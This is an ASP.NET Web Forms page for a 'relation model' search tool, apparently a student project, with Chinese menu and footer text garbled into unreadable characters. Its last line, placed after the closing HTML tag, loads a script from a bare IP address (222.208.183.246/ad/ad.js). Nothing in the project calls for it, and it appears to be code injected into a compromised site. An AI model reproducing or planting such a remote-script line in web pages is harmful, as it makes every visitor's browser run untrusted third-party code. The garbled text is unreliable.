<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rmodelsearch.aspx.vb" Inherits="relation.rmodelsearch"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>rmodelsearch</title>
		<meta name="GENERATOR" content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_LANGUAGE" content="Visual Basic .NET 7.1">
		<meta name="vs_defaultClientScript" content="JavaScript">
		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">
	</HEAD>
	<body>
		<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
			border="0" valign="middle">
			<TR>
				<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
					<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
				</TD>
			</TR>
			<TR bgColor="#ffffff">
				<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
			</TR>
			<TR>
				<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
			</TR>
		</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
		<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
			<TR>
				<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
					<DIV align="center"><FONT color="#666666"><B>
								<asp:Label id="timetext" runat="server"></asp:Label>
								&nbsp; </B></FONT>
					</DIV>
				</TD>
				<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
					<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
				</TD>
				<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
					height="18">
					<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
									href="rmodelpublish.aspx" target="_top">����</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
									href="rmodelsearch.aspx" target="_top">��ѯ</A>&nbsp;<A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
									href="rmodelmodification.aspx" target="_top">�޸�</A> </FONT></SPAN>
					</DIV>
				</TD>
			</TR>
		</TABLE>
		<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
		<FONT face="����"></FONT>
		<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
			<TR border="0">
				<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
					<FONT color="#000000">&nbsp;|<SPAN class="p9"> <a href="index.aspx">��ҳ</a></SPAN> |</FONT>
					<FONT color="#000000"><SPAN class="p9"><a href="index.aspx">�û���¼</a></SPAN> |<a href="newcustomer.aspx">ע��</a>
					</FONT>
				</TD>
			</TR>
			<TR border="0">
				<TD vAlign="top" width="172" bgColor="#0859ad" height="20">&nbsp;
					<asp:Label id="lblHint" runat="server" ForeColor="Info">Label</asp:Label></TD>
				<TD vAlign="top" bgColor="#0859ad" height="20">
					<DIV align="right"><FONT color="#ffffff"><marquee direction="left" behavior="scroll" scrolldelay="100" loop="-1">��ӭ�� 
								&nbsp;���ҵ�����ѣ� &nbsp; &nbsp;</marquee>
						</FONT>
					</DIV>
				</TD>
			</TR>
		</TABLE>
		<CENTER>
			<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
				border="0">
				<TR>
					<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
						<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
							<TR>
								<TD vAlign="top" bgColor="#0859ad">
									<DIV align="center"><FONT face="����"></FONT>&nbsp;</DIV>
								</TD>
							</TR>
						</TABLE>
						<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
							<TR>
								<TD vAlign="top" bgColor="#9cd7ef">
									<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 40px" height="40" src="imga/grad.gif" width="172">&nbsp;
										<TABLE id="Table15" style="WIDTH: 153px; HEIGHT: 128px" width="153" border="1">
											<TR>
												<TD width="147" height="45">
													<DIV align="center">&nbsp;<a href="rmodelsearch.aspx">&nbsp;��ѯ��ϵ�ռ�</a></DIV>
												</TD>
											</TR>
											<TR>
												<TD height="43">
													<DIV align="center"><a href="rdefinitionsearch.aspx">��ѯ��ϵ����</a></DIV>
												</TD>
											</TR>
											<TR>
												<TD height="55">
													<DIV align="center"><a href="rinstancesearch.aspx">��ѯ��ϵʵ��</a></DIV>
												</TD>
											</TR>
										</TABLE>
										<BR>
										<BR>
									</DIV>
								</TD>
							</TR>
						</TABLE>
					</TD>
					<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
					<TD vAlign="top" width="611">
						<FORM style="MARGIN: 0px" name="loginForm" action="" method="post" runat="server">
							&nbsp;&nbsp;
							<TABLE id="Table1" style="WIDTH: 574px; HEIGHT: 358px" cellSpacing="1" cellPadding="1"
								width="574" border="1">
								<TR>
									<TD><FONT face="����">
											<TABLE id="Table2" style="WIDTH: 562px; HEIGHT: 322px" cellSpacing="1" cellPadding="1"
												width="562" border="1">
												<TR>
													<TD style="WIDTH: 241px; HEIGHT: 96px">&nbsp;&nbsp;&nbsp;
														<TABLE id="Table3" style="WIDTH: 536px; HEIGHT: 34px" cellSpacing="1" cellPadding="1" width="536"
															border="1">
															<TR>
																<TD style="WIDTH: 62px"></TD>
																<TD style="WIDTH: 186px">
																	<asp:Label id="lblModel" runat="server" Width="104px">��ϵ�ռ�����:</asp:Label></TD>
																<TD style="WIDTH: 29px"></TD>
																<TD>
																	<asp:Button id="btnShowModel" runat="server" Text="��ʾȫ����ϵ�ռ�"></asp:Button></TD>
															</TR>
														</TABLE>
														&nbsp;&nbsp;&nbsp;&nbsp;
													</TD>
												</TR>
												<TR>
													<TD style="WIDTH: 241px; HEIGHT: 27px">
														<asp:DataGrid id="dgrdModel" runat="server"></asp:DataGrid></TD>
												</TR>
											</TABLE>
										</FONT>
										<asp:label id="lblWarning" runat="server" Width="556px" ForeColor="#0000C0">label</asp:label>
									</TD>
								</TR>
							</TABLE>
						</FORM>
					</TD>
				</TR>
			</TABLE>
		</CENTER> <!---====================include pagetail================-->
		<CENTER>
			<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="778" border="0">
				<TR>
					<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
				</TR>
				<TR>
					<TD class="p9" background="imga/bg5.gif">
						<DIV align="center">| �������� | �ͷ��绰��<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
					</TD>
				</TR>
				<TR>
					<TD class="p9" bgColor="#ffffff"><FONT face="����">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
							��Ȩ���У�&nbsp;&nbsp; �㽭��ѧԺ��Ϣ����ѧԺ����022 ������ ½���� </FONT>
					</TD>
				</TR>
			</TABLE>
		</CENTER>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
